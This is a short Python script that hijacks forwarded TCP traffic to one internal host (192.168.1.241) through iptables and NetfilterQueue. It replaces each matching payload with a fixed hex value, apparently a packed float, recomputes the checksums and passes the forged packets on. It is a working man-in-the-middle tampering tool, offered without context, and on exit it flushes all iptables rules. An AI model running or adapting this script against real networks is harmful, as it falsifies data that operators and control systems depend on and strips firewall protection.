#!/usr/bin/python
from scapy.all import *
from netfilterqueue import NetfilterQueue
import sys
import os
import time

print "\n[*] Redirect traffic to the NFQUEUE... \n"
os.system("ip link set dev enp0s3 promisc on")
os.system("iptables -A FORWARD -p tcp --tcp-flags ALL PSH,ACK -d 192.168.1.241 -j NFQUEUE --queue-num 1")
#os.system("iptables -t nat -A PREROUTING -p tcp -d 192.168.1.241 -j NFQUEUE --queue-num 1")


def print_and_accept(pkt):
    print(pkt)
    #print pkt['TCP'].flags
    packet = IP(pkt.get_payload())

    #modify payload
    payload = str(packet[TCP].payload)
    payload_lenght = len(payload.encode("HEX"))
    print payload_lenght
    print payload
    payload_hex='300000009a9999999999c9bf00000000000000000000000000000000000000000000000000000000000000000000000000000000'
    new_payload = str(payload_hex.decode("HEX"))
    

    #if packet[IP].len==104:
    if payload_lenght>=104 and payload_lenght%104==0:
        n=payload_lenght/104
        packet[TCP].remove_payload()
        packet[TCP].add_payload(new_payload*n)
        print new_payload*n

        #change some fields
        packet[IP].len = len(packet)
        del packet[IP].chksum
        del packet[TCP].chksum

        pkt.set_payload(str(packet))
    pkt.accept()


nfqueue = NetfilterQueue()
#1 is the iptabels rule queue number, modify is the callback function
nfqueue.bind(1, print_and_accept) 
try:
    print "[*] waiting for data"
    nfqueue.run()
except KeyboardInterrupt:
    nfqueue.unbind()
    os.system("iptables -F")


